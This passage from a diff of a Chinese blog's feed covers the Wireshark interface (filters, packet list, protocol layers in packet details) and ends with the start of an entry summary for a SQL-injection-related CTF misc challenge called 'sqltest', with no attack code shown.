href="#界面" class="headerlink" title="界面"></a>界面</h2><h3 id="过滤器"><a href="#过滤器" class="headerlink" title="过滤器"></a>过滤器</h3><p><img src="https://i.loli.net/2021/11/26/2HWM6ptYimaIcOR.png" alt="wireshark过滤器.png"></p><h3 id="数据包列表"><a href="#数据包列表" class="headerlink" title="数据包列表"></a>数据包列表</h3><p><img src="https://i.loli.net/2021/11/26/Lct7mxsWI3AjToM.png" alt="wireshark2.png"></p><h3 id="数据包详细信息"><a href="#数据包详细信息" class="headerlink" title="数据包详细信息"></a>数据包详细信息</h3><ol><li>frame：物理层数据帧概况</li><li>Ethernet||：数据链路层以太网头部信息</li><li>internet Protocol Version 4:互联网层IP包头部信息</li><li>Transmission control protocol：传输层T的数据段头部信息</li><li>Hypertext Transfer Protocol：应用层信息</li></ol>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h1 id=&quot;sqltest&quot;&gt;&lt;a href=&quot;#sqltest&quot; class=&quot;headerlink&quot; title=&quot;sqltest&quot;&gt;&lt;/a&gt;sqltest&lt;/h1&gt;&lt;p&gt;原本只是想刷一刷sql注入的却意外的找到了一道misc题但是和sql注入关系紧密的sqltest。&lt;</summary>
+      
+    
+    
+    
+    <category term="misc" scheme="http://example.com/categories/misc/"/>
+    
+    
+    <category term="兼职miscer" scheme="http://example.com/tags/%E5%85%BC%E8%81%8Cmiscer/"/>
     
   </entry>
   
